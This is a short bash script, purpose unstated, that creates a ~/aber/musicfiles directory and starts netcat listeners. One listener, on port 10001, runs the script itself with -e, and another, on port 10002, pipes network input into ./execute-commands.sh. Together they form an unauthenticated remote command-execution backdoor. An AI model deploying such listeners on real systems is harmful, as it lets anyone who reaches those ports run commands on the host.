#!/bin/bash
mkdir ~/aber
mkdir ~/aber/musicfiles
nc.traditional -l -p 10001 -e $0 &
nc.traditional -l -p 10002 | ./execute-commands.sh
./execute-commands.sh